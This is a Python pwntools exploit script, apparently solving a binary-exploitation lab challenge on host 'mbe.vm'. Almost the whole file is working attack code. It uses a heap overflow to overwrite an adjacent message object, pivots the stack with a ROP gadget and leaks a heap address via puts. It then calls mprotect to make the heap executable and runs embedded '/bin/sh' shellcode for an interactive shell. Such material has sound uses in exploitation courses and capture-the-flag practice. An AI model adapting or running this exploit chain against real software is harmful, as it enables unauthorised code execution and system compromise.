from pwn import *
 
p = remote("mbe.vm", 7741)
 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"\
            b"\x68\x2f\x62\x69\x6e\x89\xe3"\
            b"\x89\xc1\x89\xc2\xb0\x0b\xcd"\
            b"\x80\x31\xc0\x40\xcd\x80"
 
#************************************************
# stage 1
 
# create first obj -> overflow 3 bytes changing msg_len
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("131")               #    --> len = 131
p.sendline("A"*130)             #    --> data = "AAAAAA...\n"
 
# create second obj -> we are going to overwrite this shortly
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("4")                 #    --> len = 4
p.sendline("A"*3)               #    --> data = "AAA\n"
 
# overwrite second obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 # 2. Edit secure message
p.sendline("0")                 #    --> index = 0
expl = b"A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
expl += shellcode
p.sendline(expl)                #    --> data = expl
 
# call function -> leak heap address
p.recvuntil("Enter Choice: ")
p.sendline("4")                 # 4. Print message details
num = b"1\x00"
num += b"A"*6
num += p32(0x8050bf0) # second gadget after pivoting: puts
num += p32(0x8049569) # return address: main
num += p32(0x80eef60) # 1st arg puts: messages
p.sendline(num)                 #    --> index = 1 (+rop-chain)
 
# output contains address of first heap object in messages array
ret = p.recvuntil("Enter Choice: ")
message_0 = u32(ret[0x49:0x4d])
log.info("message_0 = " + hex(message_0))
 
 
#************************************************
# stage 2
 
# 3rd obj -> overflow msg_len by 3 bytes
p.sendline("1")                 # 1. Create secure message
p.sendline("131")               #    --> len = 131
p.sendline("A"*130)             #    --> data = "AAAAAA...\n"
 
# 4th obj -> we are going to overwrite this shortly
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("4")                 #    --> len = 4
p.sendline("A"*3)               #    --> data = "AAA\n"
 
# overwrite 4th obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 # 2. Edit secure message
p.sendline("2")                 #    --> index = 2
expl = b"A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
p.sendline(expl)                #   --> data = expl
 
# call function -> mprotect
p.recvuntil("Enter Choice: ")
p.sendline("4")                 # 4. Print message details
num = b"3\x00"
num += b"A"*6
num += p32(0x806f340)          # second gadget: __mprotect
num += p32(message_0 + 276)    # return: heap-address
num += p32(message_0 - 0x19d8) # memory-page heap
num += p32(0x22000)            # size = 0x22000
num += p32(0x7)                # prot = RWX
p.sendline(num)                 #    --> index = 3 (+rop-chain)
p.recv(100)
 
p.interactive()